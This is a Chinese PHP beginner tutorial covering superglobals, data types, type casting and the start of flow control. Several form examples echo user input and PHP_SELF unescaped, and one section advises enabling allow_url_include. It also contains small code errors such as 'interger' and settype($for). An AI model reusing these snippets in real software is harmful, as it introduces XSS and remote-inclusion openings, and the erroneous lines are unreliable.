<p>从带有 POST 方法的表单发送的信息，对任何人都是不可见的（不会显示在浏览器的地址栏），并且对发送信息的量也没有限制</p>
<p>默认情况下，POST方法的发送信息的量最大值为 8 MB，可通过设置 php.ini 文件中的 post_max_size 进行更改</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;form method=&quot;post&quot; action=&quot;&lt;?php echo $_SERVER[&quot;PHP_SELF&quot;];?&gt;&quot;&gt;</span><br><span class="line">    Name: &lt;input type=&quot;text&quot; name=&quot;name&quot;&gt;</span><br><span class="line">    &lt;input type=&quot;submit&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">echo $_POST[&quot;name&quot;];</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>



<h3 id="FILES"><a href="#FILES" class="headerlink" title="$_FILES"></a>$_FILES</h3><p>HTTP 文件上传变量</p>
<p>通过 HTTP POST 方式上传到当前脚本的项目的数组</p>
<p>该数组有以下元素</p>
<table>
<thead>
<tr>
<th align="center">元素</th>
<th align="center">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="center"><code>$_FILES[filename][name]</code></td>
<td align="center">储存了上传文件的上传名</td>
</tr>
<tr>
<td align="center"><code>$_FILES[filename][size]</code></td>
<td align="center">存储了上传文件的大小，单位为字节</td>
</tr>
<tr>
<td align="center"><code>$_FILES[filename][tmp_name]</code></td>
<td align="center">文件上传的临时文件</td>
</tr>
<tr>
<td align="center"><code>$_FILES[filename][type]</code></td>
<td align="center">上传文件的类型</td>
</tr>
<tr>
<td align="center"><code>$_FILES[filename][error]</code></td>
<td align="center">存储了上传结果，返回0说明上传成功</td>
</tr>
</tbody></table>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;form method=&quot;post&quot; action=&quot;&lt;?php echo $_SERVER[&quot;PHP_SELF&quot;];?&gt;&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="line"># 上传文件的form表单必须有enctype属性</span><br><span class="line">    &lt;input type=&quot;file&quot; name=&quot;name&quot;&gt;</span><br><span class="line">    # 上传文件域,type类型为file</span><br><span class="line">    &lt;input type=&quot;submit&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;?php</span><br><span class="line"># if语句判断变量是否为空</span><br><span class="line">if (!empty($_FILES))&#123;</span><br><span class="line">    # 使用循环遍历数组，输出上传文件的信息</span><br><span class="line">    foreach ($_FILES[&quot;name&quot;] as $name =&gt; $value)</span><br><span class="line">        echo $name.&quot;=&quot;.$value.&quot;&lt;br&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">name=test.jpg</span><br><span class="line">type=image/jpeg</span><br><span class="line">tmp_name=D:\Temp\php2B5A.tmp</span><br><span class="line">error=0</span><br><span class="line">size=41860</span><br></pre></td></tr></table></figure>



<h3 id="REQUEST"><a href="#REQUEST" class="headerlink" title="$_REQUEST"></a>$_REQUEST</h3><p>HTTP Request变量，用来收集通过 GET 和 POST 方法发送的表单数据</p>
<p>预定义的 <code>$_REQUEST</code> 变量包含了 <code>$_GET</code>、<code>$_POST</code> 和 <code>$_COOKIE</code> 的内容</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;form method=&quot;post&quot; action=&quot;&lt;?php echo $_SERVER[&quot;PHP_SELF&quot;];?&gt;&quot;&gt;</span><br><span class="line">    Name: &lt;input type=&quot;text&quot; name=&quot;name&quot;&gt;</span><br><span class="line">    &lt;input type=&quot;submit&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">echo $_REQUEST[&quot;name&quot;];</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>



<h3 id="SESSION"><a href="#SESSION" class="headerlink" title="$_SESSION"></a>$_SESSION</h3><p>PHP session 变量用于存储关于用户会话（session）的信息，或者更改用户会话（session）的设置。Session 变量存储单一用户的信息，并且对于应用程序中的所有页面都是可用的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$_SESSION[&quot;user&quot;] = &quot;admin&quot;;</span><br><span class="line">echo $_SESSION[&quot;user&quot;];</span><br></pre></td></tr></table></figure>



<h3 id="ENV"><a href="#ENV" class="headerlink" title="$_ENV"></a>$_ENV</h3><p>环境变量</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">var_dump(<span class="variable">$_ENV</span>);</span><br><span class="line">print_r(<span class="variable">$_ENV</span>);</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_ENV</span> <span class="keyword">as</span> <span class="variable">$key</span>=&gt;<span class="variable">$val</span>)&#123;<span class="keyword">echo</span> <span class="variable">$key</span>.<span class="string">&#x27;--------&#x27;</span>.<span class="variable">$val</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;&#125;</span><br></pre></td></tr></table></figure>



<h3 id="COOKIE"><a href="#COOKIE" class="headerlink" title="$_COOKIE"></a>$_COOKIE</h3><p>HTTP Cookies</p>
<p>Cookie实际上是一个很小的文本文件，网站通过向用户硬盘中写入一个Cookie文件来标识用户。当用户下次再访问该网站时，浏览器会将Cookie信息发送给网站服务器，服务器通过读取以前写入的Cookie文件中的信息，就能识别该用户</p>
<p>Cookie的两种形式：<br>（1）会话Cookie。临时性的，只在浏览器打开时存在，主要用来实现Session技术。<br>（2）永久Cookie。永久性的，保存在用户硬盘上并在有效期内一直可用。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$value</span> = <span class="string">&quot;This is Cookie.&quot;</span>;</span><br><span class="line">setcookie(<span class="string">&quot;name&quot;</span>,<span class="variable">$value</span>,time()+<span class="number">3600</span>*<span class="number">24</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_COOKIE</span>[<span class="string">&quot;name&quot;</span>];</span><br></pre></td></tr></table></figure>



<h3 id="php-errormsg"><a href="#php-errormsg" class="headerlink" title="$php_errormsg"></a>$php_errormsg</h3><p>前一个错误信息，自PHP7.2.0废弃，用函数<code>error_get_last()</code> 代替</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">@ strpos();</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$php_errormsg</span>;</span><br><span class="line"><span class="comment"># strpos() expects at least 2 parameters, 0 given</span></span><br><span class="line"><span class="keyword">echo</span> error_get_last();</span><br></pre></td></tr></table></figure>



<h3 id="http-response-header"><a href="#http-response-header" class="headerlink" title="$http_response_header"></a>$http_response_header</h3><p>HTTP响应头</p>
<p>需要在php.ini文件中配置来支持https</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">extension=php_openssl.dll</span><br><span class="line">allow_url_include = On</span><br></pre></td></tr></table></figure>

<p>获取响应</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$url</span> = <span class="string">&quot;http://www.baidu.com&quot;</span>;</span><br><span class="line">file_get_contents(<span class="variable">$url</span>);</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$http_response_header</span> <span class="keyword">as</span> <span class="variable">$key</span>=&gt;<span class="variable">$val</span>)&#123;<span class="keyword">echo</span> <span class="variable">$key</span>.<span class="string">&#x27;--------&#x27;</span>.<span class="variable">$val</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;&#125;</span><br><span class="line"><span class="comment">//var_dump($http_response_header);</span></span><br></pre></td></tr></table></figure>



<h3 id="argv"><a href="#argv" class="headerlink" title="$argv"></a>$argv</h3><p>传递给脚本的参数数组</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">var_dump(<span class="variable">$argv</span>);</span><br><span class="line"><span class="comment"># array(0) &#123; &#125;</span></span><br><span class="line">var_dump(<span class="variable">$argc</span>);</span><br><span class="line"><span class="comment"># int(0)</span></span><br></pre></td></tr></table></figure>



<h3 id="argc"><a href="#argc" class="headerlink" title="$argc"></a>$argc</h3><p>传递给脚本的参数数目</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">var_dump(<span class="variable">$argv</span>);</span><br><span class="line"><span class="comment"># array(0) &#123; &#125;</span></span><br><span class="line">var_dump(<span class="variable">$argc</span>);</span><br><span class="line"><span class="comment"># int(0)</span></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>编程语言</category>
        <category>PHP</category>
        <category>PHP基础</category>
      </categories>
      <tags>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP-数据类型</title>
    <url>//d2fabb7958df.html</url>
    <content><![CDATA[<h2 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h2><p>PHP有十种原始数据类型</p>
<p>四种标量类型：</p>
<ul>
<li><p>Bool（布尔型）</p>
</li>
<li><p>int （整型）</p>
</li>
<li><p>float （浮点型，double）</p>
</li>
<li><p>string （字符串）</p>
</li>
</ul>
<p>四种复合类型：</p>
<ul>
<li>array（数组）</li>
<li>object （对象）</li>
<li>callable （可调用）</li>
<li>iterable （可迭代）</li>
</ul>
<p>两种特殊类型：</p>
<ul>
<li>resource （资源）</li>
<li>NULL （无类型）</li>
</ul>
<h2 id="类型储存大小"><a href="#类型储存大小" class="headerlink" title="类型储存大小"></a>类型储存大小</h2><p>在计算机中，数据的大小以<strong>字节</strong>来表示，计算单位为<code>byte</code>，一个字节占八位</p>
<p>int 类型在PHP中占用四个字节</p>
<p>float 类型在PHP中占用八个字节</p>
<h2 id="数据储存形式"><a href="#数据储存形式" class="headerlink" title="数据储存形式"></a>数据储存形式</h2><p>在计算机中，通常以补码的形式，保存数据</p>
<h2 id="机器数"><a href="#机器数" class="headerlink" title="机器数"></a>机器数</h2><p>一个数字在计算机呆呆储存形式是二进制数，我们称之为机器数</p>
<p>机器数的最高位代表符号位，0表示正数，1表示负数</p>
<p>因为带有符号位，所以机器数的值分为形式值和真值</p>
<p>以机器数10000111为例，真值是-7，而形式值是135</p>
<p>只有负数的真值与形式值不同，因为光凭借机器数无法区分正负值</p>
<h3 id="原码"><a href="#原码" class="headerlink" title="原码"></a>原码</h3><p>原码与机器数一样，即用最高位表示符号，其余表示二进制的数值</p>
<blockquote>
<p>  +1的原码为    0000 0001</p>
<p>  -1 的原码为    1000 0001</p>
</blockquote>
<h3 id="反码"><a href="#反码" class="headerlink" title="反码"></a>反码</h3><p>正数的反码就是原码本身</p>
<p>负数的反码就是在原码的基础上，符号位不变，数值位取反</p>
<blockquote>
<p>  +1的原码为    0000 0001    = 反码：0000 0001</p>
<p>  -1 的原码为    1000 0001    = 反码： 1111 1110</p>
</blockquote>
<h3 id="补码"><a href="#补码" class="headerlink" title="补码"></a>补码</h3><p>正数的补码是原码本身</p>
<p>负数的补码是在原码的基础上，符号位不变，数值位取反后加1</p>
<blockquote>
<p>  +1的原码为    0000 0001    = 反码：0000 0001    = 补码：0000 0001</p>
<p>  -1 的原码为    1000 0001    = 反码： 1111 1110    = 补码：1111 1111</p>
</blockquote>
<h2 id="类型声明"><a href="#类型声明" class="headerlink" title="类型声明"></a>类型声明</h2><p>只在PHP 7. 4.0以及之后的版本有效</p>
<p>类型声明可以用于声明参数的类型</p>
<table>
<thead>
<tr>
<th align="center">类型</th>
<th align="center">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="center">类/接口/名称</td>
<td align="center">值为指定类和接口的实例化对象</td>
</tr>
<tr>
<td align="center">self</td>
<td align="center">值必定是所在方法的类的一个</td>
</tr>
<tr>
<td align="center">array</td>
<td align="center">值必须为array</td>
</tr>
<tr>
<td align="center">callable</td>
<td align="center">值必定为一个有效的callable，不能用于类属性的类型声明</td>
</tr>
<tr>
<td align="center">bool</td>
<td align="center">值必须为一个布尔值</td>
</tr>
<tr>
<td align="center">float</td>
<td align="center">值必须为一个浮点数</td>
</tr>
<tr>
<td align="center">int</td>
<td align="center">值必须为一个整型数字</td>
</tr>
<tr>
<td align="center">string</td>
<td align="center">值必须是字符串</td>
</tr>
<tr>
<td align="center">iterable</td>
<td align="center">值必须为array或者instanceof  Traversable，可迭代对象</td>
</tr>
<tr>
<td align="center">object</td>
<td align="center">值必须为对象</td>
</tr>
<tr>
<td align="center">mixed</td>
<td align="center">值可以是任何类型</td>
</tr>
</tbody></table>
<h2 id="类型转换"><a href="#类型转换" class="headerlink" title="类型转换"></a>类型转换</h2><table>
<thead>
<tr>
<th align="center">转换语句</th>
<th align="center">转换类型</th>
</tr>
</thead>
<tbody><tr>
<td align="center">（Boolean）</td>
<td align="center">转换成布尔型</td>
</tr>
<tr>
<td align="center">（string）</td>
<td align="center">转换成字符串</td>
</tr>
<tr>
<td align="center">（integer）</td>
<td align="center">转换成整型</td>
</tr>
<tr>
<td align="center">（float）</td>
<td align="center">转换成浮点型</td>
</tr>
<tr>
<td align="center">（array）</td>
<td align="center">转换成数组</td>
</tr>
<tr>
<td align="center">（object）</td>
<td align="center">转换成对象</td>
</tr>
<tr>
<td align="center">settype($x,type)</td>
<td align="center">强制转换数据类型</td>
</tr>
</tbody></table>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$foo</span> = <span class="number">10</span>;</span><br><span class="line"><span class="variable">$bar</span> = (<span class="keyword">string</span>) <span class="variable">$foo</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$foo</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>可以通过settype()函数强制转换数据类型</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$foo</span> = <span class="number">10</span>;</span><br><span class="line"><span class="variable">$bar</span> = settype(<span class="variable">$for</span>,<span class="string">&#x27;string&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$foo</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<h2 id="类型比较"><a href="#类型比较" class="headerlink" title="类型比较"></a>类型比较</h2><p>松散比较：使用两个等号<code>==</code>，只比较值，不比较类型</p>
<p>严格比较：使用三个等号<code>===</code>，比较值和类型</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="number">10</span> === <span class="string">&quot;10&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;类型相等&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;类型不相等&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="获取数据类型"><a href="#获取数据类型" class="headerlink" title="获取数据类型"></a>获取数据类型</h2><p>在PHP中，可以通过函数<code>gettype()</code>获取变量的数据类型</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="variable">$a</span> = <span class="string">&#x27;hello&#x27;</span>;</span><br><span class="line">	<span class="variable">$b</span> = <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">echo</span> gettype(<span class="variable">$a</span>);</span><br><span class="line">	<span class="comment"># string</span></span><br><span class="line">	var_dump(gettype(<span class="variable">$a</span>));</span><br><span class="line">	<span class="comment"># string(6) &quot;string&quot;</span></span><br><span class="line">	var_dump(gettype(<span class="variable">$b</span>));</span><br><span class="line">	<span class="comment"># string(7) &quot;interger&quot;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<h2 id="检查数据类型"><a href="#检查数据类型" class="headerlink" title="检查数据类型"></a>检查数据类型</h2><table>
<thead>
<tr>
<th align="center">函数</th>
<th align="center">检测类型</th>
</tr>
</thead>
<tbody><tr>
<td align="center">is_bool(x)</td>
<td align="center">检测变量是否为布尔类型</td>
</tr>
<tr>
<td align="center">is_string(x)</td>
<td align="center">检测变量是否为字符串</td>
</tr>
<tr>
<td align="center">is_float/is_double</td>
<td align="center">检测变量是否为浮点型</td>
</tr>
<tr>
<td align="center">is_int/is_integer</td>
<td align="center">检测变量是否为整型</td>
</tr>
<tr>
<td align="center">is_null()</td>
<td align="center">检测变量是否为NULL</td>
</tr>
<tr>
<td align="center">is_array()</td>
<td align="center">检测变量是否为数组</td>
</tr>
<tr>
<td align="center">is_object()</td>
<td align="center">检测变量是否为对象类型</td>
</tr>
<tr>
<td align="center">is_numeric()</td>
<td align="center">检测变量是否为数字或者数字组成的字符串</td>
</tr>
</tbody></table>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$a</span> = <span class="number">10</span>;</span><br><span class="line">    var_dump(is_int(<span class="variable">$a</span>));</span><br><span class="line">	var_dump(is_string(<span class="variable">$a</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<h2 id="Boolean布尔类型"><a href="#Boolean布尔类型" class="headerlink" title="Boolean布尔类型"></a>Boolean布尔类型</h2><p>Boolean 表达了真值，可以为<code>True</code>或者<code>False</code></p>
<p>两者在PHP中不区分大小写</p>
<p>要明确的将一个值转换成Boolean，用<code>Bool</code>或者<code>Boolean</code>来强制转换</p>
<p>当转换为Boolean时，以下值被认为是False：</p>
<ul>
<li>布尔值<code>False</code>本身</li>
<li>整型值<code>0</code>以及<code>-0</code></li>
<li>浮点型值<code>0.0</code>以及<code>-0.0</code></li>
<li>空字符串，以及字符串<code>&quot;0&quot;</code></li>
<li>不包括任何元素的数组</li>
<li>特殊类型<code>NULL</code>（包括尚未赋值的变量）</li>
<li>从空标记生成的<code>simpleXML</code>对象</li>
</ul>
<p>所有其他值都被认为是True</p>
<h2 id="integer整型"><a href="#integer整型" class="headerlink" title="integer整型"></a>integer整型</h2><p>整型值int可以用十进制，十六进制，八进制，二进制表示</p>
<p>要使用八进制表达，数字前必须加上<code>0</code></p>
<p>要使用十六进制表达，数字前必须加上<code>0x</code></p>
<p>要使用二进制表达，数字前必须加上<code>0b</code></p>
<p>当给定的数超出了int的范围，将会被解析为float</p>
<p>系统分配四个字节储存</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 32位系统</span></span><br><span class="line">max_number = <span class="number">2147483647</span></span><br><span class="line"><span class="comment"># 64位系统</span></span><br><span class="line">max_number = <span class="number">9223372036854775807</span></span><br><span class="line"><span class="comment"># 当数字超出了max_number,就会被PHP解析为float</span></span><br></pre></td></tr></table></figure>



<h2 id="Float浮点型"><a href="#Float浮点型" class="headerlink" title="Float浮点型"></a>Float浮点型</h2><p>浮点型也叫浮点数float，双精度数double或者实数real</p>
<p>通常最大值是1.8e308并且具有14位十进制数字的精度（64位IEEE格式）</p>
<p>转换浮点数</p>
<p>如果字符串是数字或前导数字，则它将解析为相应的浮点值，否则将转换为零</p>
<p>对于其他类型，要先转换成int，在转换为float</p>
<p>系统分配八个字节储存</p>
<h2 id="String字符串"><a href="#String字符串" class="headerlink" title="String字符串"></a>String字符串</h2><p>一个字符串 string 就是由一系列的字符组成，其中每个字符等同于一个字节。这意味着 PHP 只能支持 256 的字符集，因此不支持 Unicode 。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 单引号</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;hello&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 双引号</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;hello&quot;</span>:</span><br><span class="line"></span><br><span class="line"><span class="comment"># Heredoc结构</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&lt;&lt;&lt;EOT</span></span><br><span class="line"><span class="string">我是字符串</span></span><br><span class="line"><span class="string">EOT</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Nowdoc结构,不解析中间的PHP代码</span></span><br><span class="line"><span class="keyword">echo</span> &lt;&lt;&lt;<span class="string">&#x27;EOT&#x27;</span></span><br><span class="line">我是字符串</span><br><span class="line">EOT;</span><br></pre></td></tr></table></figure>

<h3 id="转义"><a href="#转义" class="headerlink" title="转义"></a>转义</h3><table>
<thead>
<tr>
<th align="center">符号</th>
<th align="center">含义</th>
</tr>
</thead>
<tbody><tr>
<td align="center"><code>\n</code></td>
<td align="center">换行</td>
</tr>
<tr>
<td align="center"><code>\r</code></td>
<td align="center">回车</td>
</tr>
<tr>
<td align="center"><code>\t</code></td>
<td align="center">水平制表符</td>
</tr>
<tr>
<td align="center"><code>\v</code></td>
<td align="center">垂直制表符</td>
</tr>
<tr>
<td align="center"><code>\e</code></td>
<td align="center">Escape</td>
</tr>
<tr>
<td align="center"><code>\f</code></td>
<td align="center">换页</td>
</tr>
<tr>
<td align="center"><code>\\</code></td>
<td align="center">反斜线</td>
</tr>
<tr>
<td align="center"><code>\$</code></td>
<td align="center">美元标记</td>
</tr>
<tr>
<td align="center"><code>\&quot;</code></td>
<td align="center">双引号</td>
</tr>
<tr>
<td align="center"><code>\&#39;</code></td>
<td align="center">单引号</td>
</tr>
<tr>
<td align="center"><code>\[0-7]&#123;1,3&#125;</code></td>
<td align="center">符合该正则表达式序列的是一个以八进制方式来表达的字符</td>
</tr>
<tr>
<td align="center"><code>\x[0-9A-Fa-f]&#123;1,2&#125;</code></td>
<td align="center">符合该正则表达式序列的是一个以十六进制方式来表达的字符</td>
</tr>
<tr>
<td align="center"><code>\u&#123;[0-9A-Fa-f]+&#125;</code></td>
<td align="center">匹配正则表达式的字符序列是 unicode 码位， 该码位能作为 UTF-8 的表达方式输出字符串</td>
</tr>
</tbody></table>
<h2 id="数字字符串"><a href="#数字字符串" class="headerlink" title="数字字符串"></a>数字字符串</h2><p>如果一个PHP String可以被解释为 int 或者 float 类型，则被定义为数字字符串</p>
<h2 id="Array数组"><a href="#Array数组" class="headerlink" title="Array数组"></a>Array数组</h2><p>PHP 中的 array 实际上是一个有序映射，映射是一种把<code>value</code>关联到<code>keys</code>的类型</p>
<p>它可以被视为数组，列表（向量），哈希表（映射的实现），字典，集合，堆栈，队列等等</p>
<p>由于 array 的值可以是其它 array 所以树形结构和多维 array 也是允许的</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 定义数组array()</span></span><br><span class="line"><span class="variable">$array</span> = <span class="keyword">array</span>(</span><br><span class="line">	key =&gt; value,</span><br><span class="line">	key1 =&gt; value1,</span><br><span class="line">	key2 =&gt; value2,</span><br><span class="line">    ...</span><br><span class="line">);</span><br><span class="line"><span class="variable">$array</span> = [</span><br><span class="line">    key =&gt; value,</span><br><span class="line">    key2 =&gt; value2,</span><br><span class="line">];</span><br><span class="line"><span class="variable">$array1</span> = <span class="keyword">array</span>(<span class="number">10</span>,<span class="number">20</span>,<span class="number">30</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;第一个: <span class="subst">$array1</span>[0]&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;第二个: <span class="subst">$array1</span>[1]&lt;br&gt;&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>其中的<code>key</code>会被强制转换</p>
<ul>
<li>string中包含十进制int，除非数字前面有<code>+</code>，否则会被转换为int类型，<code>08</code>不会被强制转换</li>
<li>floa也会被转换为Int，小数部分会被直接舍去</li>
<li>Bool也会被转换成int，True会被转换为1，False会被转换为0</li>
<li>NULL会被转换为空字符串</li>
<li>Array和object不能被用为键名</li>
</ul>
<p>如果在数组定义时多个元素都使用相同键名，那么只有最后一个会被使用，其它的元素都会被覆盖</p>
<h2 id="Iterable可迭代对象"><a href="#Iterable可迭代对象" class="headerlink" title="Iterable可迭代对象"></a>Iterable可迭代对象</h2><p>Iterable 是PHP 7.1 中引入的一个伪类型，它接受任何<code>array</code>或者实现了<code>Traversable</code>接口的对象</p>
<p>这些类型都能用<code>foreach</code>迭代，也可以和生成器里的<code>yield from</code>一起使用</p>
<p>所有可以被迭代的对象都是可迭代对象，它是一个形式上的说法</p>
<h2 id="Object对象"><a href="#Object对象" class="headerlink" title="Object对象"></a>Object对象</h2><p>对象是存储数据和有关如何处理数据的数据类型，是系统中描述客观事物的实体</p>
<p>一个对象由一组属性和对这组属性进行操作的一组服务组成</p>
<p>在PHP中，必须先声明对象</p>
<p>必须声明对象的类，类里面包含了属性和方法</p>
<p>使用关键字Var来声明变量，即创建了类的属性，也叫类的成员属性</p>
<p>通过在类定义中声明函数，即创建了类的方法</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">header(<span class="string">&quot;content-type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">class_name</span></span>&#123;</span><br><span class="line">	<span class="keyword">var</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">function_name</span>(<span class="params">arg1,arg2...</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;name.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;hello&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># 实例化对象</span></span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> class_name();</span><br><span class="line"><span class="comment"># 访问成员属性和方法</span></span><br><span class="line"><span class="variable">$test</span>-&gt;name = <span class="string">&quot;张三&quot;</span>;</span><br><span class="line"><span class="variable">$test</span>-&gt;function_name;</span><br></pre></td></tr></table></figure>



<h2 id="Resource资源类型"><a href="#Resource资源类型" class="headerlink" title="Resource资源类型"></a>Resource资源类型</h2><p>资源resource是一种特殊变量，保存了到外部资源的引用，资源是通过专门的函数来建立和使用的</p>
<p>由于资源类型变量保存是为打开文件，数据库链接，图形画布等特殊句柄，因此将其他类型转换为资源没有意义</p>
<h2 id="NULL"><a href="#NULL" class="headerlink" title="NULL"></a>NULL</h2><p>NULL值表示一个没有变量的值，NULL类型唯一的值就是null</p>
<p>在下列情况下变量被认为是null：</p>
<ul>
<li>被赋值为null</li>
<li>尚未被赋值</li>
<li>被unset()释放</li>
</ul>
<h2 id="Callback-Callable类型"><a href="#Callback-Callable类型" class="headerlink" title="Callback / Callable类型"></a>Callback / Callable类型</h2><p>回调函数就是通过函数参数传递到其他代码的，某一块可执行代码的引用</p>
<p>也就是将函数作为参数传到另一个函数里面，当那个函数执行结束之后，再执行传过去的那个函数</p>
<p>可以使用<code>callable</code>类型指定回调类型<code>callback</code></p>
<p>一些函数如<code>call_user_func()</code>或<code>usort()</code>可以接受用户自定义的回调作为参数</p>
<p>回调函数不止可以是简单函数，还可以是对象方法，包括静态类方法</p>
]]></content>
      <categories>
        <category>编程语言</category>
        <category>PHP</category>
        <category>PHP基础</category>
      </categories>
      <tags>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP-流程控制</title>
    <url>//21a655428a61.html</url>
    <content><![CDATA[<h2 id="流程控制"><a href="#流程控制" class="headerlink" title="流程控制"></a>流程控制</h2><p>在一个程序执行的过程中，代码块执行的顺序是对程序运行结果有直接的影响</p>
<p>在PHP中，使用多种流程控制语句，以便使相应的代码在代码块中执行不同的操作结果</p>
<h2 id="流程控制代替语法"><a href="#流程控制代替语法" class="headerlink" title="流程控制代替语法"></a>流程控制代替语法</h2><p>PHP 提供了一些流程控制的代替语法，包括<code>if</code>，<code>while</code>，<code>for</code>，<code>foreach</code>，<code>switch</code></p>
<p>代替语法的基本形式是把花括号进行替换</p>
<p>左花括号替换为<code>:</code>，右花括号替换为<code>endif</code>，<code>endwhile</code>，<code>endfor</code>，<code>endforeach</code>，<code>endswitch</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$i</span> = <span class="number">5</span>;</span><br><span class="line">	<span class="keyword">if</span> (<span class="variable">$i</span> == <span class="number">10</span>):</span><br><span class="line">		<span class="keyword">echo</span> <span class="variable">$i</span>;</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$i</span> 小于10&quot;</span>;</span><br><span class="line">	<span class="keyword">endif</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<h2 id="if-条件控制语句"><a href="#if-条件控制语句" class="headerlink" title="if 条件控制语句"></a>if 条件控制语句</h2><p>(PHP 4, PHP 5, PHP 7, PHP 8)</p>
<p><code>if</code>语句是一种条件控制语句，按照条件执行不同的代码块</p>
<p>PHP中<code>if</code>语句的格式为：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span> (表达式)</span><br><span class="line">        语句;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span> (表达式)&#123;</span><br><span class="line">        语句<span class="number">1</span>;</span><br><span class="line">        语句<span class="number">2</span>;</span><br><span class="line">        ...;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>如果表达式的值为真，就顺序执行语句；否则，就跳过该<code>if</code>语句再往下执行</p>
<p>如果需要执行的语句不只一条，那么可以使用符号<code>&#123;&#125;</code>，来使多个代码组成代码块执行</p>
<h2 id="if…else-条件控制语句"><a href="#if…else-条件控制语句" class="headerlink" title="if…else 条件控制语句"></a>if…else 条件控制语句</h2><p>(PHP 4, PHP 5, PHP 7, PHP 8)</p>
<p><code>if...else</code>语句是一种条件控制语句，它延伸了<code>if</code>语句</p>
